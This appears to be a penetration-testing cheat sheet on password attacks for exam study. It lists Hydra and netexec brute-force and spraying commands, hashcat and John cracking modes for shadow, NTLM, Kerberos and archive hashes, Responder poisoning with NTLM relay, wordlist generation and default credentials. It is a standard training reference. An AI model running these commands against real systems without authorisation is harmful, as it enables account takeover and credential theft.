# Password Attacks

## Online brute force / spraying — Hydra

```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -L users.txt -P pass.txt -t 4 ssh://$IP

# FTP
hydra -l user -P rockyou.txt ftp://$IP

# HTTP POST form (find the request in Burp; F= failure string)
hydra -l admin -P rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# HTTP basic auth
hydra -L users.txt -P pass.txt $IP http-get /admin

# RDP / SMB (SMB: prefer netexec)
hydra -l admin -P pass.txt rdp://$IP
netexec smb $IP -u users.txt -p pass.txt --continue-on-success
```
**Spray, don't hammer:** one common password across many users avoids lockouts. Check the lockout policy first (`netexec ... --pass-pol`).

---

## Offline hash cracking

### Identify the hash
```bash
hashid '<hash>'      # or hash-identifier ; or check hashcat --example-hashes
```

### hashcat (GPU, fast) — common modes
```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # + rules
hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d?d'                                 # mask/brute
hashcat --show hashes.txt          # show already-cracked
```

| Mode | Hash type |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM (Windows) |
| 1800 | sha512crypt `$6$` (Linux /etc/shadow) |
| 500 | md5crypt `$1$` |
| 3200 | bcrypt `$2*$` |
| 5600 | NetNTLMv2 (from Responder) |
| 13100 | Kerberoast TGS-REP |
| 18200 | AS-REP |
| 22000 | WPA-PBKDF2 |

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt
john --show hashes.txt
# unshadow for Linux:
unshadow /etc/passwd /etc/shadow > crack.txt ; john crack.txt
```

### Cracking specific artifacts
```bash
# /etc/shadow → hashcat -m 1800 (for $6$)
# ZIP / RAR / 7z / SSH key / KeePass / Office → *2john then john/hashcat
zip2john file.zip > z.hash ; john z.hash
ssh2john id_rsa > k.hash ; john k.hash            # crack a passphrase-protected key
keepass2john file.kdbx > kp.hash ; hashcat -m 13400 kp.hash rockyou.txt
office2john doc.docx > o.hash
```

---

## Responder (LLMNR/NBT-NS poisoning → NetNTLMv2)

Grab hashes on a network segment (e.g. after a foothold / on internal AD subnet):
```bash
sudo responder -I tun0        # or the internal interface
# capture NetNTLMv2 → crack:
hashcat -m 5600 responder.hash rockyou.txt
# or relay (when SMB signing off): impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## Wordlist generation & mangling

```bash
# From a target website (harvest words → password candidates)
cewl -d 2 -m 5 http://$IP -w custom.txt

# Rule-based mutation
hashcat --stdout custom.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Targeted guesses from personal info
# (crunch for masks — use sparingly, huge output)
crunch 8 8 -t Summer@%% > season.txt

# username lists
# /usr/share/seclists/Usernames/  and generate first.last permutations from names you found
```

---

## Default credentials

Always try before brute-forcing: `admin:admin`, `admin:password`, `root:root`, `tomcat:tomcat`, `sa:` (blank), `postgres:postgres`, vendor defaults. See SecLists `Passwords/Default-Credentials/`.

---

## Practical tips

- **Reuse is king.** A password found on box A → try it for every user on A, and on every other host/service/domain account.
- Crack the *easy* stuff first (`rockyou.txt` no rules), then add `best64.rule`, then masks.
- On the exam, don't burn hours brute-forcing — it's usually a rabbit hole. Enumerate for the *actual* cred first.
